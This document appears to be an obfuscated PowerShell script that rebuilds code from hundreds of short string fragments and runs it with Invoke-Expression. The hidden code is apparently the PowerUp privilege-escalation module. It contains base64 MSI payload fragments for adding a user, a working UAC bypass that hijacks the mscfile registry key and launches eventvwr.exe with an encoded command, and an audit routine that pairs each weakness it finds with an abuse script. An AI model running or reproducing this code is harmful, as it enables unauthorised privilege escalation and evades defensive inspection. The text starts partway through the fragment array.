A','AAAAAAAAAAAA','ACBzZXQuICBU','aGUgZGVmYXVs','dCBpcyAiQUxM','Ii5BY3Rpb25Q','cm9wZXJ0eVRo','ZSBwcm9wZXJ0','eSB0byBzZXQg','d2hlbiBhIHBy','b2R1Y3QgaW4g','dGhpcyBzZXQg','aXMgZm91bmQu','Q29zdEluaXRp','YWxpemVGaWxl','Q29zdENvc3RG','aW5hbGl6ZUlu','c3RhbGxWYWxp','ZGF0ZUluc3Rh','bGxJbml0aWFs','aXplSW5zdGFs','bEFkbWluUGFj','a2FnZUluc3Rh','bGxGaWxlc0lu','c3RhbGxGaW5h','bGl6ZUV4ZWN1','dGVBY3Rpb25Q','dWJsaXNoRmVh','dHVyZXNQdWJs','aXNoUHJvZHVj','dGJ6LldyYXBw','ZWRTZXR1cFBy','b2dyYW1iei5D','dXN0b21BY3Rp','b25EbGxiei5Q','cm9kdWN0Q29t','cG9uZW50e0VE','RTEwRjZDLTMw','RjQtNDJDQS1C','NUM3LUFEQjkw','NUU0NUJGQ31C','Wi5JTlNUQUxM','Rk9MREVScmVn','OUNBRTU3QUY3','QjlGQjRFRjI3','MDZGOTVCNEI4','M0I0MTlTZXRQ','cm9wZXJ0eUZv','ckRlZmVycmVk','YnouTW9kaWZ5','UmVnaXN0cnlb','QlouV1JBUFBF','RF9BUFBJRF1i','ei5TdWJzdFdy','YXBwZWRBcmd1','bWVudHNfU3Vi','c3RXcmFwcGVk','QXJndW1lbnRz','QDRiei5SdW5X','cmFwcGVkU2V0','dXBbYnouU2V0','dXBTaXplXSAi','W1NvdXJjZURp','cl1cLiIgW0Ja','LklOU1RBTExf','U1VDQ0VTU19D','T0RFU10gKltC','Wi5GSVhFRF9J','TlNUQUxMX0FS','R1VNRU5UU11b','V1JBUFBFRF9B','UkdVTUVOVFNd','X01vZGlmeVJl','Z2lzdHJ5QDRi','ei5Vbmluc3Rh','bGxXcmFwcGVk','X1VuaW5zdGFs','bFdyYXBwZWRA','NFByb2dyYW1G','aWxlc0ZvbGRl','cmJ4anZpbHc3','fFtCWi5DT01Q','QU5ZTkFNRV1U','QVJHRVRESVIu','U291cmNlRGly','UHJvZHVjdEZl','YXR1cmVNYWlu','IEZlYXR1cmVQ','cm9kdWN0SWNv','bkZpbmRSZWxh','dGVkUHJvZHVj','dHNMYXVuY2hD','b25kaXRpb25z','VmFsaWRhdGVQ','cm9kdWN0SURN','aWdyYXRlRmVh','dHVyZVN0YXRl','c1Byb2Nlc3ND','b21wb25lbnRz','VW5wdWJsaXNo','RmVhdHVyZXNS','ZW1vdmVSZWdp','c3RyeVZhbHVl','c1dyaXRlUmVn','aXN0cnlWYWx1','ZXNSZWdpc3Rl','clVzZXJSZWdp','c3RlclByb2R1','Y3RSZW1vdmVF','eGlzdGluZ1By','b2R1Y3RzTk9U','IFJFTU9WRSB+','PSJBTEwiIEFO','RCBOT1QgVVBH','UkFERVBST0RV','Q1RDT0RFUkVN','T1ZFIH49ICJB','TEwiIEFORCBO','T1QgVVBHUkFE','SU5HUFJPRFVD','VENPREVOT1Qg','V0lYX0RPV05H','UkFERV9ERVRF','Q1RFRERvd25n','cmFkZXMgYXJl','IG5vdCBhbGxv','d2VkLkFMTFVT','RVJTMUFSUE5P','UkVQQUlSQVJQ','Tk9NT0RJRllB','UlBQUk9EVUNU','SUNPTkFSUEhF','TFBMSU5LaHR0','cDovL3d3dy5l','eGVtc2kuY29t','QVJQVVJMSU5G','T0FCT1VUQVJQ','Q09NTUVOVFNN','U0kgVGVtcGxh','dGUuQVJQQ09O','VEFDVE15IGNv','bnRhY3QgaW5m','b3JtYXRpb24u','QVJQVVJMVVBE','QVRFSU5GT015','IHVwZGF0ZSBp','bmZvcm1hdGlv','bi5CWi5WRVJG','QlouV1JBUFBF','RF9BUFBJRHs1','NjYyODkxMi04','RUQ0LTQ4RUYt','QUM1Mi1FRTgz','QTFCRkJGMTF9','X2lzMUJaLkNP','TVBBTllOQU1F','RVhFTVNJLkNP','TUJaLklOU1RB','TExfU1VDQ0VT','U19DT0RFUzBC','Wi5GSVhFRF9J','TlNUQUxMX0FS','R1VNRU5UUy9T','SUxFTlQgQlou','VUlOT05FX0lO','U1RBTExfQVJH','VU1FTlRTIEJa','LlVJQkFTSUNf','SU5TVEFMTF9B','UkdVTUVOVFNC','Wi5VSVJFRFVD','RURfSU5TVEFM','TF9BUkdVTUVO','VFNCWi5VSUZV','TExfSU5TVEFM','TF9BUkdVTUVO','VFNCWi5GSVhF','RF9VTklOU1RB','TExfQVJHVU1F','TlRTQlouVUlO','T05FX1VOSU5T','VEFMTF9BUkdV','TUVOVFNCWi5V','SUJBU0lDX1VO','SU5TVEFMTF9B','UkdVTUVOVFNC','Wi5VSVJFRFVD','RURfVU5JTlNU','QUxMX0FSR1VN','RU5UU0JaLlVJ','RlVMTF9VTklO','U1RBTExfQVJH','VU1FTlRTYnou','U2V0dXBTaXpl','MjMyOTYwTWFu','dWZhY3R1cmVy','UHJvZHVjdENv','ZGV7MjcxQkJD','RUQtRjM2QS00','RThFLUE1NzYt','OTQ1NUYwQ0Ew','MUE4fVByb2R1','Y3RMYW5ndWFn','ZTEwMzNQcm9k','dWN0TmFtZU1T','SSBXcmFwcGVy','IFRlbXBsYXRl','UHJvZHVjdFZl','cnNpb24xLjAu','MC4we0NDMDM1','QzE4LTBGQzct','NDcwOC04ODA2','LUQ0QjA5MUU1','OUFBN31TZWN1','cmVDdXN0b21Q','cm9wZXJ0aWVz','V0lYX0RPV05H','UkFERV9ERVRF','Q1RFRDtXSVhf','VVBHUkFERV9E','RVRFQ1RFRFNP','RlRXQVJFXFtC','Wi5DT01QQU5Z','TkFNRV1cTVNJ','IFdyYXBwZXJc','SW5zdGFsbGVk','XFtCWi5XUkFQ','UEVEX0FQUElE','XUxvZ29uVXNl','cltMb2dv''

 ','   try {
   ','     [System','.Convert]::F','romBase64Str','ing( $Binary',' ) | Set-Con','tent -Path $','Path -Encodi','ng Byte
    ','    Write-Ve','rbose "MSI w','ritten out t','o ''$Path''"

','        $Out',' = New-Objec','t PSObject
 ','       $Out ','| Add-Member',' Notepropert','y ''OutputPat','h'' $Path
   ','     $Out.PS','Object.TypeN','ames.Insert(','0, ''PowerUp.','UserAddMSI'')','
        $Ou','t
    }
    ','catch {
    ','    Write-Wa','rning "Error',' while writi','ng to locati','on ''$Path'': ','$_"
    }
}
','

function I','nvoke-EventV','wrBypass {
<','#
.SYNOPSIS
','
Bypasses UA','C by perform','ing an image',' hijack on t','he .msc file',' extension
O','nly tested o','n Windows 7 ','and Windows ','10

Author: ','Matt Nelson ','(@enigma0x3)','  
License: ','BSD 3-Clause','  
Required ','Dependencies',': None

.PAR','AMETER Comma','nd

 Specifi','es the comma','nd you want ','to run in a ','high-integri','ty context. ','For example,',' you can pas','s it powersh','ell.exe foll','owed by any ','encoded comm','and "powersh','ell -enc <en','codedCommand','>"

.EXAMPLE','

Invoke-Eve','ntVwrBypass ','-Command "C:','\Windows\Sys','tem32\Window','sPowerShell\','v1.0\powersh','ell.exe -enc',' IgBJAHMAIAB','FAGwAZQB2AGE','AdABlAGQAOgA','gACQAKAAoAFs','AUwBlAGMAdQB','yAGkAdAB5AC4','AUAByAGkAbgB','jAGkAcABhAGw','ALgBXAGkAbgB','kAG8AdwBzAFA','AcgBpAG4AYwB','pAHAAYQBsAF0','AWwBTAGUAYwB','1AHIAaQB0AHk','ALgBQAHIAaQB','uAGMAaQBwAGE','AbAAuAFcAaQB','uAGQAbwB3AHM','ASQBkAGUAbgB','0AGkAdAB5AF0','AOgA6AEcAZQB','0AEMAdQByAHI','AZQBuAHQAKAA','pACkALgBJAHM','ASQBuAFIAbwB','sAGUAKABbAFM','AZQBjAHUAcgB','pAHQAeQAuAFA','AcgBpAG4AYwB','pAHAAYQBsAC4','AVwBpAG4AZAB','vAHcAcwBCAHU','AaQBsAHQASQB','uAFIAbwBsAGU','AXQAnAEEAZAB','tAGkAbgBpAHM','AdAByAGEAdAB','vAHIAJwApACk','AIAAtACAAJAA','oAEcAZQB0AC0','ARABhAHQAZQA','pACIAIAB8ACA','ATwB1AHQALQB','GAGkAbABlACA','AQwA6AFwAVQB','BAEMAQgB5AHA','AYQBzAHMAVAB','lAHMAdAAuAHQ','AeAB0ACAALQB','BAHAAcABlAG4','AZAA="

This',' will write ','out "Is Elev','ated: True" ','to C:\UACByp','assTest.
#>
','
    [Cmdlet','Binding(Supp','ortsShouldPr','ocess = $Tru','e, ConfirmIm','pact = ''Medi','um'')]
    Pa','ram (
      ','  [Parameter','(Mandatory =',' $True)]
   ','     [Valida','teNotNullOrE','mpty()]
    ','    [String]','
        $Co','mmand,

    ','    [Switch]','
        $Fo','rce
    )
  ','  $ConsentPr','ompt = (Get-','ItemProperty',' HKLM:\SOFTW','ARE\Microsof','t\Windows\Cu','rrentVersion','\Policies\Sy','stem).Consen','tPromptBehav','iorAdmin
   ',' $SecureDesk','topPrompt = ','(Get-ItemPro','perty HKLM:\','SOFTWARE\Mic','rosoft\Windo','ws\CurrentVe','rsion\Polici','es\System).P','romptOnSecur','eDesktop

  ','  if($Consen','tPrompt -Eq ','2 -And $Secu','reDesktopPro','mpt -Eq 1){
','        "UAC',' is set to ''','Always Notif','y''. This mod','ule does not',' bypass this',' setting."
 ','       exit
','    }
    el','se{
        ','#Begin Execu','tion
       ',' $mscCommand','Path = "HKCU',':\Software\C','lasses\mscfi','le\shell\ope','n\command"
 ','       $Comm','and = $pshom','e + ''\'' + $C','ommand
     ','   #Add in t','he new regis','try entries ','to hijack th','e msc file
 ','       if ($','Force -or ((','Get-ItemProp','erty -Path $','mscCommandPa','th -Name ''(d','efault)'' -Er','rorAction Si','lentlyContin','ue) -eq $nul','l)){
       ','     New-Ite','m $mscComman','dPath -Force',' |
         ','       New-I','temProperty ','-Name ''(Defa','ult)'' -Value',' $Command -P','ropertyType ','string -Forc','e | Out-Null','
        }el','se{
        ','    Write-Wa','rning "Key a','lready exist','s, consider ','using -Force','"
          ','  exit
     ','   }

      ','  if (Test-P','ath $mscComm','andPath) {
 ','           W','rite-Verbose',' "Created re','gistry entri','es to hijack',' the msc ext','ension"
    ','    }else{
 ','           W','rite-Warning',' "Failed to ','create regis','try key, exi','ting"
      ','      exit
 ','       }

  ','      $Event','vwrPath = Jo','in-Path -Pat','h ([Environm','ent]::GetFol','derPath(''Sys','tem'')) -Chil','dPath ''event','vwr.exe''
   ','     #Start ','Event Viewer','
        if ','($PSCmdlet.S','houldProcess','($EventvwrPa','th, ''Start p','rocess'')) {
','            ','$Process = S','tart-Process',' -FilePath $','EventvwrPath',' -PassThru
 ','           W','rite-Verbose',' "Started ev','entvwr.exe"
','        }

 ','       #Slee','p 5 seconds ','
        Wri','te-Verbose "','Sleeping 5 s','econds to tr','igger payloa','d"
        i','f (-not $PSB','oundParamete','rs[''WhatIf'']',') {
        ','    Start-Sl','eep -Seconds',' 5
        }','

        $m','scfilePath =',' "HKCU:\Soft','ware\Classes','\mscfile"

 ','       if (T','est-Path $ms','cfilePath) {','
           ',' #Remove the',' registry en','try
        ','    Remove-I','tem $mscfile','Path -Recurs','e -Force
   ','         Wri','te-Verbose "','Removed regi','stry entries','"
        }
','
        if(','Get-Process ','-Id $Process','.Id -ErrorAc','tion Silentl','yContinue){
','            ','Stop-Process',' -Id $Proces','s.Id
       ','     Write-V','erbose "Kill','ed running e','ventvwr proc','ess"
       ',' }
    }
}

','
function In','voke-Privesc','Audit {
<#
.','SYNOPSIS

Ex','ecutes all f','unctions tha','t check for ','various Wind','ows privileg','e escalation',' opportuniti','es.

Author:',' Will Schroe','der (@harmj0','y)  
License',': BSD 3-Clau','se  
Require','d Dependenci','es: None  

','.DESCRIPTION','

Executes a','ll functions',' that check ','for various ','Windows priv','ilege escala','tion opportu','nities.

.PA','RAMETER Form','at

String. ','Format to de','cide on what',' is returned',' from the co','mmand, an Ob','ject Array, ','List, or HTM','L Report.

.','PARAMETER HT','MLReport

DE','PRECATED - S','witch. Write',' a HTML vers','ion of the r','eport to SYS','TEM.username','.html. 
Supe','rseded by th','e Format par','ameter.

.EX','AMPLE

Invok','e-PrivescAud','it

Runs all',' escalation ','checks and o','utputs a sta','tus report f','or discovere','d issues.

.','EXAMPLE

Inv','oke-PrivescA','udit -Format',' HTML

Runs ','all escalati','on checks an','d outputs a ','status repor','t to SYSTEM.','username.htm','l
detailing ','any discover','ed issues.

','#>

    [Dia','gnostics.Cod','eAnalysis.Su','ppressMessag','eAttribute(''','PSShouldProc','ess'', '''')]
 ','   [CmdletBi','nding()]
   ',' Param(
    ','    [Validat','eSet(''Object',''',''List'',''HT','ML'')]
      ','  [String]
 ','       $Form','at = ''Object',''',
        [','Switch]
    ','    $HTMLRep','ort
    )

 ','   if($HTMLR','eport){ $For','mat = ''HTML''',' }

    if (','$Format -eq ','''HTML'') {
  ','      $HtmlR','eportFile = ','"$($Env:Comp','uterName).$(','$Env:UserNam','e).html"
   ','     $Header',' = "<style>"','
        $He','ader = $Head','er + "BODY{b','ackground-co','lor:peachpuf','f;}"
       ',' $Header = $','Header + "TA','BLE{border-w','idth: 1px;bo','rder-style: ','solid;border','-color: blac','k;border-col','lapse: colla','pse;}"
     ','   $Header =',' $Header + "','TH{border-wi','dth: 1px;pad','ding: 0px;bo','rder-style: ','solid;border','-color: blac','k;background','-color:thist','le}"
       ',' $Header = $','Header + "TD','{border-widt','h: 3px;paddi','ng: 0px;bord','er-style: so','lid;border-c','olor: black;','background-c','olor:palegol','denrod}"
   ','     $Header',' = $Header +',' "</style>"
','        Conv','ertTo-HTML -','Head $Header',' -Body "<H1>','PowerUp repo','rt for ''$($E','nv:ComputerN','ame).$($Env:','UserName)''</','H1>" | Out-F','ile $HtmlRep','ortFile
    ','}

    Write','-Verbose "Ru','nning Invoke','-PrivescAudi','t"

    $Che','cks = @(
   ','     # Initi','al admin che','cks
        ','@{
         ','   Type    =',' ''User Has L','ocal Admin P','rivileges''
 ','           C','ommand = { i','f (([Securit','y.Principal.','WindowsPrinc','ipal] [Secur','ity.Principa','l.WindowsIde','ntity]::GetC','urrent()).Is','InRole([Secu','rity.Princip','al.WindowsBu','iltInRole] "','Administrato','r")){ New-Ob','ject PSObjec','t } }
      ','  },
       ',' @{
        ','    Type    ','    = ''User ','In Local Gro','up with Admi','n Privileges','''
          ','  Command   ','  = { if ((G','et-ProcessTo','kenGroup | S','elect-Object',' -ExpandProp','erty SID) -c','ontains ''S-1','-5-32-544''){',' New-Object ','PSObject } }','
           ',' AbuseScript',' = { ''Invoke','-WScriptUACB','ypass -Comma','nd "..."'' }
','        },
 ','       @{
  ','          Ty','pe       = ''','Process Toke','n Privileges','''
          ','  Command   ',' = { Get-Pro','cessTokenPri','vilege -Spec','ial | Where-','Object {$_} ','}
        },','
        # S','ervice check','s
        @{','
           ',' Type    = ''','Unquoted Ser','vice Paths''
','            ','Command = { ','Get-Unquoted','Service }
  ','      },
   ','     @{
    ','        Type','    = ''Modif','iable Servic','e Files''
   ','         Com','mand = { Get','-ModifiableS','erviceFile }','
        },
','        @{
 ','           T','ype    = ''Mo','difiable Ser','vices''
     ','       Comma','nd = { Get-M','odifiableSer','vice }
     ','   },
      ','  # DLL hija','cking
      ','  @{
       ','     Type   ','     = ''%PAT','H% .dll Hija','cks''
       ','     Command','     = { Fin','d-PathDLLHij','ack }
      ','      AbuseS','cript = { "W','rite-HijackD','ll -DllPath ','''$($_.Modifi','ablePath)\wl','bsctrl.dll''"',' }
        }',',
        # ','Registry che','cks
        ','@{
         ','   Type     ','   = ''Always','InstallEleva','ted Registry',' Key''
      ','      Comman','d     = { if',' (Get-Regist','ryAlwaysInst','allElevated)','{ New-Object',' PSObject } ','}
          ','  AbuseScrip','t = { ''Write','-UserAddMSI''',' }
        }',',
        @{','
           ',' Type    = ''','Registry Aut','ologons''
   ','         Com','mand = { Get','-RegistryAut','oLogon }
   ','     },
    ','    @{
     ','       Type ','   = ''Modifi','able Registr','y Autorun''
 ','           C','ommand = { G','et-Modifiabl','eRegistryAut','oRun }
     ','   },
      ','  # Other ch','ecks
       ',' @{
        ','    Type    ','= ''Modifiabl','e Scheduled ','Task Files''
','            ','Command = { ','Get-Modifiab','leScheduledT','askFile }
  ','      },
   ','     @{
    ','        Type','    = ''Unatt','ended Instal','l Files''
   ','         Com','mand = { Get','-UnattendedI','nstallFile }','
        },
','        @{
 ','           T','ype    = ''En','crypted web.','config Strin','gs''
        ','    Command ','= { Get-WebC','onfig | Wher','e-Object {$_','} }
        ','},
        @','{
          ','  Type    = ','''Encrypted A','pplication P','ool Password','s''
         ','   Command =',' { Get-Appli','cationHost |',' Where-Objec','t {$_} }
   ','     },
    ','    @{
     ','       Type ','   = ''McAfee',' SiteList.xm','l files''
   ','         Com','mand = { Get','-SiteListPas','sword | Wher','e-Object {$_','} }
        ','},
        @','{
          ','  Type    = ','''Cached GPP ','Files''
     ','       Comma','nd = { Get-C','achedGPPPass','word | Where','-Object {$_}',' }
        }','
    )

    ','ForEach($Che','ck in $Check','s){
        ','Write-Verbos','e "Checking ','for $($Check','.Type)..."
 ','       $Resu','lts = . $Che','ck.Command
 ','       $Resu','lts | Where-','Object {$_} ','| ForEach-Ob','ject {
     ','       $_ | ','Add-Member N','oteproperty ','''Check'' $Che','ck.Type
    ','        if (','$Check.Abuse','Script){
   ','            ',' $_ | Add-Me','mber Notepro','perty ''Abuse','Function'' (.',' $Check.Abus','eScript)
   ','         }
 ','       }
   ','     switch(','$Format){
  ','          Ob','ject { $Resu','lts }
      ','      List  ',' { "`n`n[*] ','Checking for',' $($Check.Ty','pe)..."; $Re','sults | Form','at-List }
  ','          HT','ML   { $Resu','lts | Conver','tTo-HTML -He','ad $Header -','Body "<H2>$(','$Check.Type)','</H2>" | Out','-File -Appen','d $HtmlRepor','tFile }
    ','    }
    }
','
    if ($Fo','rmat -eq ''HT','ML'') {
     ','   Write-Ver','bose "[*] Re','port written',' to ''$HtmlRe','portFile'' `n','"
    }
}


','# PSReflect ','signature sp','ecifications','
$Module = N','ew-InMemoryM','odule -Modul','eName PowerU','pModule
# [D','iagnostics.C','odeAnalysis.','SuppressMess','ageAttribute','(''PSAvoidUsi','ngPositional','Parameters'',',' '''', Scope=''','Function'')]
','
$FunctionDe','finitions = ','@(
    (func',' kernel32 Ge','tCurrentProc','ess ([IntPtr',']) @()),
   ',' (func kerne','l32 OpenProc','ess ([IntPtr',']) @([UInt32','], [Bool], [','UInt32]) -Se','tLastError),','
    (func k','ernel32 Clos','eHandle ([Bo','ol]) @([IntP','tr]) -SetLas','tError),
   ',' (func advap','i32 OpenProc','essToken ([B','ool]) @([Int','Ptr], [UInt3','2], [IntPtr]','.MakeByRefTy','pe()) -SetLa','stError)
   ',' (func advap','i32 GetToken','Information ','([Bool]) @([','IntPtr], [UI','nt32], [IntP','tr], [UInt32','], [UInt32].','MakeByRefTyp','e()) -SetLas','tError),
   ',' (func advap','i32 ConvertS','idToStringSi','d ([Int]) @(','[IntPtr], [S','tring].MakeB','yRefType()) ','-SetLastErro','r),
    (fun','c advapi32 L','ookupPrivile','geName ([Int',']) @([IntPtr','], [IntPtr],',' [String].Ma','keByRefType(','), [Int32].M','akeByRefType','()) -SetLast','Error),
    ','(func advapi','32 QueryServ','iceObjectSec','urity ([Bool',']) @([IntPtr','], [Security','.AccessContr','ol.SecurityI','nfos], [Byte','[]], [UInt32','], [UInt32].','MakeByRefTyp','e()) -SetLas','tError),
   ',' (func advap','i32 ChangeSe','rviceConfig ','([Bool]) @([','IntPtr], [UI','nt32], [UInt','32], [UInt32','], [String],',' [IntPtr], [','IntPtr], [In','tPtr], [IntP','tr], [IntPtr','], [IntPtr])',' -SetLastErr','or -Charset ','Unicode),
  ','  (func adva','pi32 CloseSe','rviceHandle ','([Bool]) @([','IntPtr]) -Se','tLastError),','
    (func n','tdll RtlAdju','stPrivilege ','([UInt32]) @','([Int32], [B','ool], [Bool]',', [Int32].Ma','keByRefType(',')))
)

# htt','ps://rohnspo','wershellblog','.wordpress.c','om/2013/03/1','9/viewing-se','rvice-acls/
','$ServiceAcce','ssRights = p','senum $Modul','e PowerUp.Se','rviceAccessR','ights UInt32',' @{
    Quer','yConfig     ','        =   ','''0x00000001''','
    ChangeC','onfig       ','     =   ''0x','00000002''
  ','  QueryStatu','s           ','  =   ''0x000','00004''
    E','numerateDepe','ndents     =','   ''0x000000','08''
    Star','t           ','        =   ','''0x00000010''','
    Stop   ','            ','     =   ''0x','00000020''
  ','  PauseConti','nue         ','  =   ''0x000','00040''
    I','nterrogate  ','           =','   ''0x000000','80''
    User','DefinedContr','ol      =   ','''0x00000100''','
    Delete ','            ','     =   ''0x','00010000''
  ','  ReadContro','l           ','  =   ''0x000','20000''
    W','riteDac     ','           =','   ''0x000400','00''
    Writ','eOwner      ','        =   ','''0x00080000''','
    Synchro','nize        ','     =   ''0x','00100000''
  ','  AccessSyst','emSecurity  ','  =   ''0x010','00000''
    G','enericAll   ','           =','   ''0x100000','00''
    Gene','ricExecute  ','        =   ','''0x20000000''','
    Generic','Write       ','     =   ''0x','40000000''
  ','  GenericRea','d           ','  =   ''0x800','00000''
    A','llAccess    ','           =','   ''0x000F01','FF''
} -Bitfi','eld

$SidAtt','ributes = ps','enum $Module',' PowerUp.Sid','Attributes U','Int32 @{
   ',' SE_GROUP_MA','NDATORY     ','         =  ',' ''0x00000001','''
    SE_GRO','UP_ENABLED_B','Y_DEFAULT   ','  =   ''0x000','00002''
    S','E_GROUP_ENAB','LED         ','       =   ''','0x00000004''
','    SE_GROUP','_OWNER      ','            ','=   ''0x00000','008''
    SE_','GROUP_USE_FO','R_DENY_ONLY ','     =   ''0x','00000010''
  ','  SE_GROUP_I','NTEGRITY    ','          = ','  ''0x0000002','0''
    SE_GR','OUP_RESOURCE','            ','   =   ''0x20','000000''
    ','SE_GROUP_INT','EGRITY_ENABL','ED      =   ','''0xC0000000''','
} -Bitfield','

$LuidAttri','butes = psen','um $Module P','owerUp.LuidA','ttributes UI','nt32 @{
    ','DISABLED    ','            ','            ','=   ''0x00000','000''
    SE_','PRIVILEGE_EN','ABLED_BY_DEF','AULT     =  ',' ''0x00000001','''
    SE_PRI','VILEGE_ENABL','ED          ','      =   ''0','x00000002''
 ','   SE_PRIVIL','EGE_REMOVED ','            ','   =   ''0x00','000004''
    ','SE_PRIVILEGE','_USED_FOR_AC','CESS        ','=   ''0x80000','000''
} -Bitf','ield

$Secur','ityEntity = ','psenum $Modu','le PowerUp.S','ecurityEntit','y UInt32 @{
','    SeCreate','TokenPrivile','ge          ','    =   1
  ','  SeAssignPr','imaryTokenPr','ivilege     ','  =   2
    ','SeLockMemory','Privilege   ','            ','=   3
    Se','IncreaseQuot','aPrivilege  ','          = ','  4
    SeUn','solicitedInp','utPrivilege ','        =   ','5
    SeMach','ineAccountPr','ivilege     ','      =   6
','    SeTcbPri','vilege      ','            ','    =   7
  ','  SeSecurity','Privilege   ','            ','  =   8
    ','SeTakeOwners','hipPrivilege','            ','=   9
    Se','LoadDriverPr','ivilege     ','          = ','  10
    SeS','ystemProfile','Privilege   ','         =  ',' 11
    SeSy','stemtimePriv','ilege       ','        =   ','12
    SePro','fileSinglePr','ocessPrivile','ge     =   1','3
    SeIncr','easeBasePrio','rityPrivileg','e     =   14','
    SeCreat','ePagefilePri','vilege      ','     =   15
','    SeCreate','PermanentPri','vilege      ','    =   16
 ','   SeBackupP','rivilege    ','            ','   =   17
  ','  SeRestoreP','rivilege    ','            ','  =   18
   ',' SeShutdownP','rivilege    ','            ',' =   19
    ','SeDebugPrivi','lege        ','            ','=   20
    S','eAuditPrivil','ege         ','           =','   21
    Se','SystemEnviro','nmentPrivile','ge        = ','  22
    SeC','hangeNotifyP','rivilege    ','         =  ',' 23
    SeRe','moteShutdown','Privilege   ','        =   ','24
    SeUnd','ockPrivilege','            ','       =   2','5
    SeSync','AgentPrivile','ge          ','      =   26','
    SeEnabl','eDelegationP','rivilege    ','     =   27
','    SeManage','VolumePrivil','ege         ','    =   28
 ','   SeImperso','natePrivileg','e           ','   =   29
  ','  SeCreateGl','obalPrivileg','e           ','  =   30
   ',' SeTrustedCr','edManAccessP','rivilege    ',' =   31
    ','SeRelabelPri','vilege      ','            ','=   32
    S','eIncreaseWor','kingSetPrivi','lege       =','   33
    Se','TimeZonePriv','ilege       ','          = ','  34
    SeC','reateSymboli','cLinkPrivile','ge       =  ',' 35
}

$SID_','AND_ATTRIBUT','ES = struct ','$Module Powe','rUp.SidAndAt','tributes @{
','    Sid     ','    =   fiel','d 0 IntPtr
 ','   Attribute','s  =   field',' 1 UInt32
}
','
$TOKEN_TYPE','_ENUM = psen','um $Module P','owerUp.Token','TypeEnum UIn','t32 @{
    P','rimary      ','   = 1
    I','mpersonation','   = 2
}

$T','OKEN_TYPE = ','struct $Modu','le PowerUp.T','okenType @{
','    Type  = ','field 0 $TOK','EN_TYPE_ENUM','
}

$SECURIT','Y_IMPERSONAT','ION_LEVEL_EN','UM = psenum ','$Module Powe','rUp.Imperson','ationLevelEn','um UInt32 @{','
    Anonymo','us         =','   0
    Ide','ntification ','   =   1
   ',' Impersonati','on     =   2','
    Delegat','ion        =','   3
}

$IMP','ERSONATION_L','EVEL = struc','t $Module Po','werUp.Impers','onationLevel',' @{
    Impe','rsonationLev','el  = field ','0 $SECURITY_','IMPERSONATIO','N_LEVEL_ENUM','
}

$TOKEN_G','ROUPS = stru','ct $Module P','owerUp.Token','Groups @{
  ','  GroupCount','  = field 0 ','UInt32
    G','roups      =',' field 1 $SI','D_AND_ATTRIB','UTES.MakeArr','ayType() -Ma','rshalAs @(''B','yValArray'', ','32)
}

$LUID',' = struct $M','odule PowerU','p.Luid @{
  ','  LowPart   ','      =   fi','eld 0 $Secur','ityEntity
  ','  HighPart  ','      =   fi','eld 1 Int32
','}

$LUID_AND','_ATTRIBUTES ','= struct $Mo','dule PowerUp','.LuidAndAttr','ibutes @{
  ','  Luid      ','   =   field',' 0 $LUID
   ',' Attributes ','  =   field ','1 UInt32
}

','$TOKEN_PRIVI','LEGES = stru','ct $Module P','owerUp.Token','Privileges @','{
    Privil','egeCount  = ','field 0 UInt','32
    Privi','leges      =',' field 1 $LU','ID_AND_ATTRI','BUTES.MakeAr','rayType() -M','arshalAs @(''','ByValArray'',',' 50)
}

$Typ','es = $Functi','onDefinition','s | Add-Win3','2Type -Modul','e $Module -N','amespace ''Po','werUp.Native','Methods''
$Ad','vapi32 = $Ty','pes[''advapi3','2'']
$Kernel3','2 = $Types[''','kernel32'']
$','NTDll    = $','Types[''ntdll',''']

Set-Alia','s Get-Curren','tUserTokenGr','oupSid Get-P','rocessTokenG','roup
Set-Ali','as Invoke-Al','lChecks Invo','ke-PrivescAu','dit
'); $script = $fragments -join ''; Invoke-Expression $script
